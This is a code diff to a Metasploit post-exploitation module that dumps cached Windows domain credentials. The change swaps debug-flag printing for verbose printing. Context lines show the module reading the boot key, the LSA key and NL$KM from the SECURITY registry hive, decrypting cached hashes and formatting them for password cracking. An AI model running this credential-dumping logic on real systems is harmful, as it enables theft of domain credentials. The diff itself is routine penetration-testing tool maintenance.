@@ -27,11 +27,6 @@ class Metasploit3 < Msf::Post
       'SessionTypes' => ['meterpreter'],
       'References'   => [['URL', 'http://lab.mediaservice.net/code/cachedump.rb']]
     ))
-
-    register_options(
-    [
-      OptBool.new('DEBUG', [true, 'Debugging output', false])
-    ], self.class)
   end
 
 
@@ -44,7 +39,7 @@ class Metasploit3 < Msf::Post
   def capture_nlkm(lsakey)
     nlkm = registry_getvaldata("HKLM\\SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal", "")
 
-    print_status("Encrypted NL$KM: #{nlkm.unpack("H*")[0]}") if( datastore['DEBUG'] )
+    vprint_status("Encrypted NL$KM: #{nlkm.unpack("H*")[0]}")
 
     if lsa_vista_style?
       nlkm_dec = decrypt_lsa_data(nlkm, lsakey)
@@ -306,7 +301,7 @@ class Metasploit3 < Msf::Post
 
       print_status('Obtaining boot key...')
       bootkey = capture_boot_key
-      print_status("Boot key: #{bootkey.unpack("H*")[0]}") if( datastore['DEBUG'] )
+      vprint_status("Boot key: #{bootkey.unpack("H*")[0]}")
 
       print_status('Obtaining Lsa key...')
       lsakey = capture_lsa_key(bootkey)
@@ -315,11 +310,11 @@ class Metasploit3 < Msf::Post
         return
       end
 
-      print_status("Lsa Key: #{lsakey.unpack("H*")[0]}") if( datastore['DEBUG'] )
+      vprint_status("Lsa Key: #{lsakey.unpack("H*")[0]}")
 
       print_status("Obtaining LK$KM...")
       nlkm = capture_nlkm(lsakey)
-      print_status("NL$KM: #{nlkm.unpack("H*")[0]}") if( datastore['DEBUG'] )
+      vprint_status("NL$KM: #{nlkm.unpack("H*")[0]}")
 
       print_status("Dumping cached credentials...")
       ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Cache", KEY_READ)
@@ -340,9 +335,9 @@ class Metasploit3 < Msf::Post
         cache = parse_cache_entry(nl)
 
         if ( cache.userNameLength > 0 )
-          print_status("Reg entry: #{nl.unpack("H*")[0]}") if( datastore['DEBUG'] )
-          print_status("Encrypted data: #{cache.enc_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
-          print_status("Ch:  #{cache.ch.unpack("H*")[0]}") if( datastore['DEBUG'] )
+          vprint_status("Reg entry: #{nl.unpack("H*")[0]}")
+          vprint_status("Encrypted data: #{cache.enc_data.unpack("H*")[0]}")
+          vprint_status("Ch:  #{cache.ch.unpack("H*")[0]}")
 
           if lsa_vista_style?
             dec_data = decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)
@@ -350,7 +345,7 @@ class Metasploit3 < Msf::Post
             dec_data = decrypt_hash(cache.enc_data, nlkm, cache.ch)
           end
 
-          print_status("Decrypted data: #{dec_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
+          vprint_status("Decrypted data: #{dec_data.unpack("H*")[0]}")
 
           john << parse_decrypted_cache(dec_data, cache)
 
